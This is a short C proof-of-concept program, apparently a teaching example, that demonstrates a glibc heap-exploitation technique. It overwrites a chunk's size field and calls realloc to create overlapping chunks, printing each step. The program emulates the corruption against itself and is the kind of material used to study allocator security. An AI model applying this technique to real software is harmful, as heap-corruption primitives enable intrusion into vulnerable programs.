#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2

typedef size_t INTERNAL_SIZE_T;

struct malloc_chunk {
    INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
    INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

    struct malloc_chunk* fd;         /* double links -- used only if free. */
    struct malloc_chunk* bk;

    /* Only used for large blocks: pointer to next larger size.  */
    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
    struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;

int main(int argc, const char* argv[]) {
    printf("the goal of this example is to create overlapping chunks via the " \
            "corruption of the size field of a chunk passed into realloc, " \
            "making it appear as if it included the entire next chunk\n");
    void *mem = malloc(0x400);
    mchunkptr victim = (mchunkptr)((char*)mem - offsetof(struct malloc_chunk, fd));
    printf("allocated victim chunk with requested size 0x400 at %p, " \
           "victim->size == 0x%zx\n", (void *)mem, victim->size);

    void *target = malloc(0x400);
    printf("allocated target chunk at %p\n", target);

    void *border = malloc(0x300);
    printf("allocated border chunk at %p\n", border);

    printf("emulating corruption of the size of victim so that it encompasses " \
           "itarget exactly \n");

    victim->prev_size = 0;
    victim->size = 0x821; 

    printf("reallocating victim with size 0x600\n");
    void *mem2 = realloc(mem, 0x600);

    printf("realloc returned: %p\n", mem2);
    return 0;
}
